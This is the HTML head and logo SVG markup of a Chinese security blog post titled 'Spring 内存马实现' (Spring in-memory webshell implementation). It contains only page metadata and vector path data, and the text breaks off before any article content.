<!DOCTYPE html>
<html lang="zh-CN" data-theme="dark">
    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
    <meta charset="UTF-8" />

    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
    
    <meta http-equiv="Cache-Control" content="no-transform" />
    
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <title>Spring 内存马实现 | MYZXCG</title>

    <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>

    
    
        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>

    

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>

    <meta name="author" content="myzxcg" /><meta name="description" content="Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行……" />

    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="MYZXCG" />
    <meta name="msapplication-starturl" content="../../../" />
    <meta name="msapplication-TileColor" content="#603cba" />
    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
    <link rel="manifest" href="/manifest.json" />


    
    

    
    <link rel="canonical" href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" />
    

<script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BlogPosting",
        "datePublished": "2021-11-13T20:59:58+08:00",
        "dateModified": "2021-11-20T15:44:06+08:00",
        "url": "https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/",
        "headline": "Spring 内存马实现",
        "description": "Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行……",
        "inLanguage" : "zh-CN",
        "articleSection": "posts",
        "wordCount":  8387 ,
        "image": ["https://myzxcg.com/images/image-20211106230151.png","https://myzxcg.com/images/image-20211106230256.png","https://myzxcg.com/images/image-20211106230341.png","https://myzxcg.com/images/image-20211106230430.png","https://myzxcg.com/images/image-20211106230512.png","https://myzxcg.com/images/image-20211106230526.png","https://myzxcg.com/images/image-20211106230540.png","https://myzxcg.com/images/image-20211106230620.png","https://myzxcg.com/images/image-20211106230642.png","https://myzxcg.com/images/image-20211106230707.png","https://myzxcg.com/images/image-20211106230726.png","https://myzxcg.com/images/image-20211106230746.png","https://myzxcg.com/images/image-20211106230757.png","https://myzxcg.com/images/image-20211106230818.png","https://myzxcg.com/images/image-20211106230833.png","https://myzxcg.com/images/image-20211106230849.png"],
        "author": {
            "@type": "Person",
            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
            "email": "myzx.xcg@gmail.com",
            "image": "https://myzxcg.com/avatar.png",
            "url": "https://myzxcg.com/",
            "name": "myzxcg"
        },
        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
        "publisher": {
            "@type": "Organization",
            "name": "MYZXCG",
            "logo": {
                "@type": "ImageObject",
                "url": "https://myzxcg.com/icons/favicon.ico"
            },
            "url": "https://myzxcg.com/"
        },
        "mainEntityOfPage": {
            "@type": "WebSite",
            "@id": "https://myzxcg.com/"
        }
    }
</script>

    

<meta name="twitter:card" content="summary_large_image" />


<meta name="twitter:site" content="@myzxcg" />
<meta name="twitter:creator" content="@myzxcg" />

    



<meta property="og:title" content="Spring 内存马实现" />
<meta property="og:description" content="Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行……" />
<meta property="og:url" content="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" />
<meta property="og:site_name" content="MYZXCG" />
<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-20211106230151.png" />
<meta property="og:type" content="article" />
    <meta property="article:published_time" content="2021-11-13T20:59:58&#43;08:00" />
    <meta property="article:modified_time" content="2021-11-20T15:44:06&#43;08:00" />
    
    <meta property="article:section" content="posts" />


        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />

        


    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-Y0LZRMN44V');
    </script>




    
    

    
</head>

    <body>
        <div class="container">
            
    <header class="header">
        
            <div class="header-wrapper">
                <div class="header-inner single">
                    
    <div class="site-brand">
        
            <a href="/"><svg data-v-423bf9ae="" xmlns="http://www.w3.org/2000/svg" class="brand" viewBox="0 0 164.20314694661778 60" class="font"><!----><defs data-v-423bf9ae=""><linearGradient data-v-423bf9ae="" gradientTransform="rotate(25)" id="9d5bfb87-9af0-4056-b335-e722243993f9" x1="0%" y1="0%" x2="100%" y2="0%"><stop data-v-423bf9ae="" offset="0%" style="stop-color: rgb(87, 93, 96); stop-opacity: 1;"></stop><stop data-v-423bf9ae="" offset="100%" style="stop-color: rgb(246, 225, 205); stop-opacity: 1;"></stop></linearGradient></defs><!----><g data-v-423bf9ae="" id="2fa46697-71c2-43ec-b51a-6d9e651e9e88" fill="#ffffff" transform="matrix(4.687500279396789,0,0,4.687500279396789,-2.1562506803318087,-24.703126859851267)"><path d="M7.24 13.04L7.24 13.04L7.24 13.04Q7.26 13.09 7.27 13.13L7.27 13.13L7.27 13.13Q7.28 13.16 7.28 13.19L7.28 13.19L7.28 13.19Q7.28 13.25 7.23 13.27L7.23 13.27L7.23 13.27Q7.18 13.28 7.12 13.29L7.12 13.29L7.12 13.29Q7.11 13.30 7.10 13.35L7.10 13.35L7.10 13.35Q7.08 13.41 7.06 13.48L7.06 13.48L7.06 13.48Q7.03 13.55 6.98 13.60L6.98 13.60L6.98 13.60Q6.93 13.66 6.84 13.66L6.84 13.66L6.84 13.66Q6.56 13.64 6.39 13.53L6.39 13.53L6.39 13.53Q6.23 13.43 6.15 13.24L6.15 13.24L6.15 13.24Q6.06 13.06 6.04 12.80L6.04 12.80L6.04 12.80Q6.02 12.54 6.02 12.23L6.02 12.23L6.02 12.23Q6.02 11.86 6.05 11.46L6.05 11.46L6.05 11.46Q6.08 11.05 6.13 10.67L6.13 10.67L6.13 10.67Q6.17 10.29 6.20 9.95L6.20 9.95L6.20 9.95Q6.23 9.61 6.23 9.37L6.23 9.37L6.23 9.37Q6.23 9.02 6.17 8.83L6.17 8.83L6.17 8.83Q6.11 8.64 6.01 8.64L6.01 8.64L6.01 8.64Q5.96 8.64 5.76 8.92L5.76 8.92L5.76 8.92Q5.56 9.21 5.29 9.78L5.29 9.78L5.29 9.78Q5.01 10.36 4.69 11.22L4.69 11.22L4.69 11.22Q4.38 12.09 4.09 13.26L4.09 13.26L4.09 13.26Q4.07 13.31 4.07 13.36L4.07 13.36L4.07 13.36Q4.07 13.42 4.07 13.46L4.07 13.46L4.07 13.46Q4.06 13.51 4.04 13.54L4.04 13.54L4.04 13.54Q4.01 13.57 3.96 13.57L3.96 13.57L3.96 13.57Q3.87 13.57 3.81 13.53L3.81 13.53L3.81 13.53Q3.76 13.49 3.72 13.45L3.72 13.45L3.72 13.45Q3.68 13.41 3.64 13.37L3.64 13.37L3.64 13.37Q3.61 13.33 3.55 13.33L3.55 13.33L3.55 13.33Q3.53 13.33 3.52 13.36L3.52 13.36L3.52 13.36Q3.51 13.38 3.49 13.42L3.49 13.42L3.49 13.42Q3.47 13.46 3.44 13.49L3.44 13.49L3.44 13.49Q3.41 13.51 3.36 13.51L3.36 13.51L3.36 13.51Q3.32 13.51 3.27 13.50L3.27 13.50L3.27 13.50Q3.23 13.48 3.18 13.41L3.18 13.41L3.18 13.41Q3.13 13.34 3.10 13.20L3.10 13.20L3.10 13.20Q3.07 13.06 3.07 12.82L3.07 12.82L3.07 12.51L3.07 12.51Q3.07 12.41 3.09 12.21L3.09 12.21L3.09 12.21Q3.11 12.01 3.13 11.74L3.13 11.74L3.13 11.74Q3.16 11.48 3.19 11.17L3.19 11.17L3.19 11.17Q3.22 10.86 3.24 10.53L3.24 10.53L3.24 10.53Q3.27 10.21 3.28 9.91L3.28 9.91L3.28 9.91Q3.30 9.60 3.30 9.34L3.30 9.34L3.30 9.34Q3.30 8.57 3.11 8.57L3.11 8.57L3.11 8.57Q3.06 8.57 3.00 8.61L3.00 8.61L3.00 8.61Q2.94 8.64 2.85 8.75L2.85 8.75L2.85 8.75Q2.77 8.85 2.66 9.05L2.66 9.05L2.66 9.05Q2.54 9.24 2.40 9.57L2.40 9.57L2.40 9.57Q2.26 9.89 2.08 10.36L2.08 10.36L2.08 10.36Q1.90 10.83 1.68 11.48L1.68 11.48L1.68 11.48Q1.63 11.63 1.58 11.90L1.58 11.90L1.58 11.90Q1.52 12.18 1.47 12.47L1.47 12.47L1.47 12.47Q1.42 12.76 1.39 13.00L1.39 13.00L1.39 13.00Q1.36 13.24 1.36 13.32L1.36 13.32L1.36 13.32Q1.36 13.34 1.29 13.38L1.29 13.38L1.29 13.38Q1.22 13.43 1.12 13.47L1.12 13.47L1.12 13.47Q1.03 13.51 0.93 13.54L0.93 13.54L0.93 13.54Q0.83 13.57 0.77 13.57L0.77 13.57L0.77 13.57Q0.66 13.57 0.59 13.50L0.59 13.50L0.59 13.50Q0.53 13.44 0.50 13.27L0.50 13.27L0.50 13.27Q0.47 13.09 0.47 12.79L0.47 12.79L0.47 12.79Q0.46 12.48 0.46 12.00L0.46 12.00L0.46 12.00Q0.46 11.88 0.48 11.52L0.48 11.52L0.48 11.52Q0.49 11.16 0.51 10.68L0.51 10.68L0.51 10.68Q0.54 10.21 0.58 9.70L0.58 9.70L0.58 9.70Q0.62 9.18 0.68 8.75L0.68 8.75L0.68 8.75Q0.73 8.32 0.81 8.04L0.81 8.04L0.81 8.04Q0.88 7.76 0.98 7.76L0.98 7.76L0.98 7.76Q1.03 7.76 1.07 7.79L1.07 7.79L1.07 7.79Q1.11 7.83 1.14 7.86L1.14 7.86L1.14 7.86Q1.18 7.90 1.21 7.94L1.21 7.94L1.21 7.94Q1.24 7.97 1.27 7.97L1.27 7.97L1.27 7.97Q1.30 7.97 1.33 7.94L1.33 7.94L1.33 7.94Q1.36 7.92 1.38 7.88L1.38 7.88L1.38 7.88Q1.41 7.84 1.43 7.81L1.43 7.81L1.43 7.81Q1.46 7.79 1.47 7.79L1.47 7.79L1.47 7.79Q1.49 7.79 1.53 7.85L1.53 7.85L1.53 7.85Q1.57 7.92 1.61 8.02L1.61 8.02L1.61 8.02Q1.65 8.11 1.68 8.21L1.68 8.21L1.68 8.21Q1.71 8.31 1.71 8.36L1.71 8.36L1.71 8.36Q1.71 8.50 1.69 8.75L1.69 8.75L1.69 8.75Q1.66 9.00 1.63 9.31L1.63 9.31L1.63 9.31Q1.60 9.61 1.58 9.93L1.58 9.93L1.58 9.93Q1.55 10.24 1.55 10.51L1.55 10.51L1.55 10.53L1.55 10.53Q1.64 10.24 1.76 9.93L1.76 9.93L1.76 9.93Q1.88 9.62 2.02 9.32L2.02 9.32L2.02 9.32Q2.17 9.02 2.33 8.76L2.33 8.76L2.33 8.76Q2.49 8.49 2.67 8.29L2.67 8.29L2.67 8.29Q2.84 8.09 3.03 7.98L3.03 7.98L3.03 7.98Q3.21 7.86 3.40 7.86L3.40 7.86L3.40 7.86Q3.64 7.86 3.80 7.94L3.80 7.94L3.80 7.94Q3.97 8.02 4.07 8.16L4.07 8.16L4.07 8.16Q4.18 8.30 4.22 8.48L4.22 8.48L4.22 8.48Q4.27 8.66 4.27 8.87L4.27 8.87L4.27 8.87Q4.27 9.04 4.25 9.28L4.25 9.28L4.25 9.28Q4.22 9.51 4.20 9.79L4.20 9.79L4.20 9.79Q4.17 10.08 4.15 10.41L4.15 10.41L4.15 10.41Q4.12 10.75 4.12 11.15L4.12 11.15L4.12 11.15Q4.20 10.90 4.33 10.56L4.33 10.56L4.33 10.56Q4.46 10.21 4.61 9.84L4.61 9.84L4.61 9.84Q4.76 9.47 4.94 9.11L4.94 9.11L4.94 9.11Q5.11 8.75 5.29 8.46L5.29 8.46L5.29 8.46Q5.47 8.18 5.65 8.00L5.65 8.00L5.65 8.00Q5.83 7.82 6.00 7.82L6.00 7.82L6.00 7.82Q6.04 7.82 6.21 7.85L6.21 7.85L6.21 7.85Q6.38 7.88 6.57 7.94L6.57 7.94L6.57 7.94Q6.75 8.00 6.92 8.08L6.92 8.08L6.92 8.08Q7.08 8.17 7.14 8.28L7.14 8.28L7.14 8.28Q7.19 8.39 7.24 8.60L7.24 8.60L7.24 8.60Q7.28 8.81 7.28 9.16L7.28 9.16L7.28 9.16Q7.28 9.47 7.24 9.90L7.24 9.90L7.24 9.90Q7.19 10.32 7.08 10.92L7.08 10.92L7.08 10.92Q7.05 11.12 7.04 11.31L7.04 11.31L7.04 11.31Q7.03 11.49 7.03 11.67L7.03 11.67L7.03 11.67Q7.03 11.93 7.05 12.15L7.05 12.15L7.05 12.15Q7.08 12.38 7.11 12.56L7.11 12.56L7.11 12.56Q7.14 12.74 7.18 12.86L7.18 12.86L7.18 12.86Q7.21 12.99 7.24 13.04ZM13.92 7.93L13.92 7.93L13.92 7.93Q13.90 7.96 13.78 8.16L13.78 8.16L13.78 8.16Q13.66 8.35 13.47 8.65L13.47 8.65L13.47 8.65Q13.29 8.95 13.05 9.33L13.05 9.33L13.05 9.33Q12.82 9.71 12.57 10.11L12.57 10.11L12.57 10.11Q12.32 10.52 12.07 10.92L12.07 10.92L12.07 10.92Q11.83 11.33 11.61 11.68L11.61 11.68L11.61 11.68Q11.40 12.03 11.24 12.30L11.24 12.30L11.24 12.30Q11.08 12.58 11.01 12.71L11.01 12.71L11.01 12.71Q10.93 12.85 10.79 13.14L10.79 13.14L10.79 13.14Q10.66 13.43 10.48 13.80L10.48 13.80L10.48 13.80Q10.30 14.17 10.10 14.60L10.10 14.60L10.10 14.60Q9.90 15.03 9.70 15.47L9.70 15.47L9.70 15.47Q9.50 15.90 9.31 16.31L9.31 16.31L9.31 16.31Q9.12 16.71 8.97 17.04L8.97 17.04L8.97 17.04Q8.83 17.36 8.73 17.56L8.73 17.56L8.73 17.56Q8.63 17.77 8.62 17.81L8.62 17.81L8.62 17.81Q8.56 17.97 8.51 18.01L8.51 18.01L8.51 18.01Q8.46 18.05 8.36 18.07L8.36 18.07L8.36 18.07Q8.31 18.07 8.29 18.04L8.29 18.04L8.29 18.04Q8.26 18.01 8.24 17.96L8.24 17.96L8.24 17.96Q8.22 17.91 8.20 17.87L8.20 17.87L8.20 17.87Q8.18 17.83 8.15 17.83L8.15 17.83L8.15 17.83Q8.06 17.81 8.05 17.79L8.05 17.79L8.05 17.79Q8.04 17.77 8.00 17.70L8.00 17.70L8.00 17.70Q7.98 17.67 7.96 17.67L7.96 17.67L7.96 17.67Q7.94 17.66 7.92 17.66L7.92 17.66L7.92 17.66Q7.90 17.66 7.89 17.66L7.89 17.66L7.89 17.66Q7.88 17.65 7.88 17.62L7.88 17.62L7.88 17.62Q7.90 17.50 7.91 17.38L7.91 17.38L7.91 17.38Q7.92 17.27 7.94 17.17L7.94 17.17L7.94 17.17Q7.96 17.10 8.08 16.86L8.08 16.86L8.08 16.86Q8.20 16.62 8.37 16.27L8.37 16.27L8.37 16.27Q8.55 15.93 8.77 15.51L8.77 15.51L8.77 15.51Q9.00 15.09 9.23 14.65L9.23 14.65L9.23 14.65Q9.45 14.22 9.68 13.79L9.68 13.79L9.68 13.79Q9.90 13.37 10.08 13.02L10.08 13.02L10.08 13.02Q9.99 12.83 9.84 12.53L9.84 12.53L9.84 12.53Q9.69 12.22 9.51 11.85L9.51 11.85L9.51 11.85Q9.33 11.48 9.13 11.06L9.13 11.06L9.13 11.06Q8.93 10.64 8.74 10.23L8.74 10.23L8.74 10.23Q8.54 9.82 8.37 9.44L8.37 9.44L8.37 9.44Q8.19 9.06 8.06 8.75L8.06 8.75L8.06 8.75Q7.92 8.45 7.85 8.25L7.85 8.25L7.85 8.25Q7.77 8.05 7.77 8.00L7.77 8.00L7.77 8.00Q7.78 7.92 7.81 7.89L7.81 7.89L7.81 7.89Q7.83 7.85 7.88 7.85L7.88 7.85L7.88 7.85Q7.92 7.85 7.97 7.88L7.97 7.88L7.97 7.88Q8.03 7.90 8.08 7.92L8.08 7.92L8.08 7.92Q8.16 7.95 8.24 7.98L8.24 7.98L8.24 7.98Q8.31 8.01 8.35 7.96L8.35 7.96L8.35 7.96Q8.37 7.90 8.46 7.90L8.46 7.90L8.46 7.90Q8.56 7.90 8.62 7.93L8.62 7.93L8.62 7.93Q8.64 7.95 8.66 7.94L8.66 7.94L8.66 7.94Q8.67 7.94 8.69 7.92L8.69 7.92L8.69 7.92Q8.71 7.90 8.73 7.87L8.73 7.87L8.73 7.87Q8.76 7.85 8.79 7.83L8.79 7.83L8.79 7.83Q8.87 7.82 8.93 7.86L8.93 7.86L8.93 7.86Q8.99 7.90 9.04 8.04L9.04 8.04L9.04 8.04Q9.08 8.14 9.18 8.39L9.18 8.39L9.18 8.39Q9.29 8.65 9.44 8.98L9.44 8.98L9.44 8.98Q9.58 9.32 9.76 9.70L9.76 9.70L9.76 9.70Q9.94 10.09 10.12 10.46L10.12 10.46L10.12 10.46Q10.29 10.83 10.46 11.16L10.46 11.16L10.46 11.16Q10.62 11.49 10.74 11.71L10.74 11.71L10.74 11.71Q10.92 11.37 11.14 10.98L11.14 10.98L11.14 10.98Q11.35 10.60 11.58 10.21L11.58 10.21L11.58 10.21Q11.80 9.82 12.02 9.45L12.02 9.45L12.02 9.45Q12.24 9.08 12.43 8.77L12.43 8.77L12.43 8.77Q12.63 8.46 12.78 8.22L12.78 8.22L12.78 8.22Q12.93 7.98 13.02 7.86L13.02 7.86L13.02 7.86Q13.08 7.79 13.08 7.77L13.08 7.77L13.08 7.77Q13.08 7.75 13.13 7.73L13.13 7.73L13.13 7.73Q13.17 7.72 13.20 7.70L13.20 7.70L13.20 7.70Q13.23 7.69 13.30 7.70L13.30 7.70L13.30 7.70Q13.36 7.72 13.40 7.72L13.40 7.72L13.40 7.72Q13.43 7.72 13.45 7.76L13.45 7.76L13.45 7.76Q13.47 7.78 13.49 7.77L13.49 7.77L13.49 7.77Q13.52 7.77 13.56 7.75L13.56 7.75L13.56 7.75Q13.60 7.73 13.64 7.71L13.64 7.71L13.64 7.71Q13.68 7.70 13.72 7.70L13.72 7.70L13.72 7.70Q13.77 7.71 13.82 7.72L13.82 7.72L13.82 7.72Q13.86 7.73 13.90 7.76L13.90 7.76L13.90 7.76Q13.94 7.79 13.95 7.83L13.95 7.83L13.95 7.83Q13.95 7.87 13.92 7.93ZM18.94 8.25L18.94 8.25L18.94 8.25Q18.92 8.29 18.90 8.31L18.90 8.31L18.90 8.31Q18.89 8.33 18.86 8.35L18.86 8.35L18.86 8.35Q18.83 8.37 18.79 8.40L18.79 8.40L18.79 8.40Q18.75 8.44 18.69 8.49L18.69 8.49L18.69 8.49Q18.57 8.58 18.30 8.83L18.30 8.83L18.30 8.83Q18.03 9.08 17.66 9.43L17.66 9.43L17.66 9.43Q17.30 9.78 16.89 10.19L16.89 10.19L16.89 10.19Q16.47 10.60 16.08 11.02L16.08 11.02L16.08 11.02Q15.68 11.43 15.34 11.81L15.34 11.81L15.34 11.81Q15.00 12.18 14.78 12.46L14.78 12.46L14.78 12.46Q15.05 12.41 15.41 12.37L15.41 12.37L15.41 12.37Q15.77 12.32 16.15 12.29L16.15 12.29L16.15 12.29Q16.54 12.26 16.92 12.24L16.92 12.24L16.92 12.24Q17.29 12.22 17.61 12.22L17.61 12.22L17.61 12.22Q18.03 12.22 18.25 12.26L18.25 12.26L18.25 12.26Q18.37 12.27 18.45 12.34L18.45 12.34L18.45 12.34Q18.54 12.40 18.60 12.48L18.60 12.48L18.60 12.48Q18.66 12.55 18.69 12.63L18.69 12.63L18.69 12.63Q18.72 12.70 18.72 12.74L18.72 12.74L18.72 12.74Q18.72 12.80 18.72 12.86L18.72 12.86L18.72 12.86Q18.73 12.91 18.72 12.96L18.72 12.96L18.72 12.96Q18.71 13.01 18.67 13.05L18.67 13.05L18.67 13.05Q18.63 13.09 18.53 13.11L18.53 13.11L18.53 13.11Q18.48 13.13 18.41 13.11L18.41 13.11L18.41 13.11Q18.33 13.10 18.27 13.08L18.27 13.08L18.27 13.08Q18.20 13.07 18.14 13.06L18.14 13.06L18.14 13.06Q18.08 13.06 18.06 13.08L18.06 13.08L18.06 13.08Q17.99 13.18 18.03 13.25L18.03 13.25L18.03 13.25Q18.07 13.32 18.17 13.41L18.17 13.41L18.17 13.41Q18.22 13.44 18.20 13.48L18.20 13.48L18.20 13.48Q18.18 13.53 18.10 13.56L18.10 13.56L18.10 13.56Q18.03 13.58 17.91 13.58L17.91 13.58L17.91 13.58Q17.79 13.58 17.65 13.54L17.65 13.54L17.65 13.54Q17.59 13.52 17.44 13.51L17.44 13.51L17.44 13.51Q17.29 13.49 17.09 13.48L17.09 13.48L17.09 13.48Q16.89 13.47 16.64 13.47L16.64 13.47L16.64 13.47Q16.39 13.46 16.13 13.46L16.13 13.46L16.13 13.46Q15.78 13.46 15.43 13.47L15.43 13.47L15.43 13.47Q15.08 13.48 14.77 13.50L14.77 13.50L14.77 13.50Q14.46 13.52 14.23 13.56L14.23 13.56L14.23 13.56Q13.99 13.59 13.87 13.64L13.87 13.64L13.87 13.64Q13.73 13.71 13.66 13.70L13.66 13.70L13.66 13.70Q13.59 13.69 13.51 13.61L13.51 13.61L13.51 13.61Q13.47 13.57 13.44 13.52L13.44 13.52L13.44 13.52Q13.40 13.48 13.38 13.44L13.38 13.44L13.38 13.44Q13.36 13.40 13.38 13.36L13.38 13.36L13.38 13.36Q13.40 13.32 13.47 13.30L13.47 13.30L13.47 13.30Q13.53 13.29 13.53 13.25L13.53 13.25L13.53 13.25Q13.54 13.21 13.51 13.17L13.51 13.17L13.51 13.17Q13.49 13.13 13.47 13.09L13.47 13.09L13.47 13.09Q13.44 13.04 13.44 13.01L13.44 13.01L13.44 13.01Q13.45 12.95 13.63 12.72L13.63 12.72L13.63 12.72Q13.82 12.49 14.13 12.15L14.13 12.15L14.13 12.15Q14.44 11.81 14.85 11.39L14.85 11.39L14.85 11.39Q15.26 10.97 15.70 10.53L15.70 10.53L15.70 10.53Q16.14 10.08 16.58 9.64L16.58 9.64L16.58 9.64Q17.03 9.19 17.42 8.81L17.42 8.81L17.42 8.81Q17.23 8.79 16.96 8.78L16.96 8.78L16.96 8.78Q16.69 8.77 16.39 8.77L16.39 8.77L16.39 8.77Q16.13 8.77 15.87 8.78L15.87 8.78L15.87 8.78Q15.61 8.78 15.38 8.79L15.38 8.79L15.38 8.79Q15.15 8.80 14.97 8.82L14.97 8.82L14.97 8.82Q14.80 8.83 14.71 8.84L14.71 8.84L14.71 8.84Q14.62 8.85 14.57 8.84L14.57 8.84L14.57 8.84Q14.53 8.83 14.52 8.81L14.52 8.81L14.52 8.81Q14.51 8.78 14.50 8.75L14.50 8.75L14.50 8.75Q14.50 8.72 14.49 8.70L14.49 8.70L14.49 8.70Q14.46 8.68 14.43 8.66L14.43 8.66L14.43 8.66Q14.40 8.64 14.38 8.61L14.38 8.61L14.38 8.61Q14.36 8.59 14.36 8.56L14.36 8.56L14.36 8.56Q14.35 8.52 14.38 8.49L14.38 8.49L14.38 8.49Q14.40 8.46 14.39 8.44L14.39 8.44L14.39 8.44Q14.37 8.42 14.34 8.40L14.34 8.40L14.34 8.40Q14.31 8.39 14.29 8.36L14.29 8.36L14.29 8.36Q14.26 8.33 14.26 8.29L14.26 8.29L14.26 8.29Q14.26 8.22 14.26 8.15L14.26 8.15L14.26 8.15Q14.27 8.08 14.32 8.07L14.32 8.07L14.32 8.07Q14.38 8.05 14.38 8.00L14.38 8.00L14.38 8.00Q14.39 7.94 14.49 7.89L14.49 7.89L14.49 7.89Q14.57 7.83 14.76 7.80L14.76 7.80L14.76 7.80Q14.94 7.77 15.19 7.75L15.19 7.75L15.19 7.75Q15.44 7.73 15.74 7.72L15.74 7.72L15.74 7.72Q16.04 7.72 16.37 7.72L16.37 7.72L16.37 7.72Q16.69 7.72 17.01 7.72L17.01 7.72L17.01 7.72Q17.34 7.72 17.63 7.73L17.63 7.73L17.63 7.73Q17.93 7.74 18.19 7.74L18.19 7.74L18.19 7.74Q18.44 7.75 18.63 7.75L18.63 7.75L18.63 7.75Q18.69 7.75 18.76 7.80L18.76 7.80L18.76 7.80Q18.83 7.85 18.88 7.93L18.88 7.93L18.88 7.93Q18.94 8.00 18.96 8.09L18.96 8.09L18.96 8.09Q18.98 8.18 18.94 8.25ZM23.63 13.04L23.63 13.04L23.63 13.04Q23.68 13.10 23.67 13.16L23.67 13.16L23.67 13.16Q23.65 13.22 23.61 13.27L23.61 13.27L23.61 13.27Q23.57 13.32 23.51 13.34L23.51 13.34L23.51 13.34Q23.45 13.36 23.41 13.34L23.41 13.34L23.41 13.34Q23.31 13.32 23.20 13.36L23.20 13.36L23.20 13.36Q23.10 13.40 23.06 13.43L23.06 13.43L23.06 13.43Q23.02 13.47 23.04 13.52L23.04 13.52L23.04 13.52Q23.06 13.57 23.10 13.62L23.10 13.62L23.10 13.62Q23.15 13.69 23.11 13.77L23.11 13.77L23.11 13.77Q23.06 13.85 22.96 13.84L22.96 13.84L22.96 13.84Q22.92 13.84 22.81 13.71L22.81 13.71L22.81 13.71Q22.70 13.58 22.54 13.38L22.54 13.38L22.54 13.38Q22.39 13.19 22.21 12.93L22.21 12.93L22.21 12.93Q22.03 12.67 21.85 12.41L21.85 12.41L21.85 12.41Q21.67 12.15 21.50 11.89L21.50 11.89L21.50 11.89Q21.33 11.64 21.21 11.44L21.21 11.44L21.21 11.44Q21.06 11.63 20.87 11.85L20.87 11.85L20.87 11.85Q20.69 12.07 20.50 12.30L20.50 12.30L20.50 12.30Q20.31 12.53 20.13 12.75L20.13 12.75L20.13 12.75Q19.95 12.96 19.80 13.13L19.80 13.13L19.80 13.13Q19.66 13.30 19.56 13.40L19.56 13.40L19.56 13.40Q19.47 13.51 19.45 13.51L19.45 13.51L19.45 13.51Q19.37 13.56 19.32 13.62L19.32 13.62L19.32 13.62Q19.27 13.69 19.17 13.71L19.17 13.71L19.17 13.71Q19.12 13.72 19.08 13.70L19.08 13.70L19.08 13.70Q19.04 13.69 19.01 13.66L19.01 13.66L19.01 13.66Q18.98 13.64 18.94 13.62L18.94 13.62L18.94 13.62Q18.91 13.60 18.87 13.61L18.87 13.61L18.87 13.61Q18.81 13.61 18.77 13.50L18.77 13.50L18.77 13.50Q18.74 13.40 18.83 13.26L18.83 13.26L18.83 13.26Q18.84 13.25 18.94 13.12L18.94 13.12L18.94 13.12Q19.04 13.00 19.21 12.79L19.21 12.79L19.21 12.79Q19.37 12.59 19.57 12.34L19.57 12.34L19.57 12.34Q19.78 12.09 20.00 11.82L20.00 11.82L20.00 11.82Q20.21 11.56 20.43 11.31L20.43 11.31L20.43 11.31Q20.64 11.05 20.82 10.86L20.82 10.86L20.82 10.86Q20.60 10.55 20.35 10.17L20.35 10.17L20.35 10.17Q20.10 9.78 19.86 9.43L19.86 9.43L19.86 9.43Q19.62 9.08 19.43 8.81L19.43 8.81L19.43 8.81Q19.24 8.54 19.17 8.46L19.17 8.46L19.17 8.46Q19.09 8.39 19.05 8.33L19.05 8.33L19.05 8.33Q19.02 8.27 19.01 8.23L19.01 8.23L19.01 8.23Q19.00 8.19 19.07 8.18L19.07 8.18L19.07 8.18Q19.10 8.18 19.11 8.15L19.11 8.15L19.11 8.15Q19.12 8.11 19.13 8.08L19.13 8.08L19.13 8.08Q19.14 8.05 19.15 8.03L19.15 8.03L19.15 8.03Q19.17 8.00 19.21 7.98L19.21 7.98L19.21 7.98Q19.28 7.96 19.41 7.96L19.41 7.96L19.41 7.96Q19.54 7.96 19.61 7.93L19.61 7.93L19.61 7.93Q19.70 7.91 19.73 7.93L19.73 7.93L19.73 7.93Q19.76 7.95 19.82 8.01L19.82 8.01L19.82 8.01Q19.84 8.04 19.85 8.03L19.85 8.03L19.85 8.03Q19.85 8.03 19.85 8.00L19.85 8.00L19.85 8.00Q19.85 7.98 19.86 7.96L19.86 7.96L19.86 7.96Q19.87 7.94 19.89 7.93L19.89 7.93L19.89 7.93Q19.95 7.91 19.98 7.90L19.98 7.90L19.98 7.90Q20.02 7.90 20.04 7.83L20.04 7.83L20.04 7.83Q20.05 7.76 20.06 7.76L20.06 7.76L20.06 7.76Q20.07 7.77 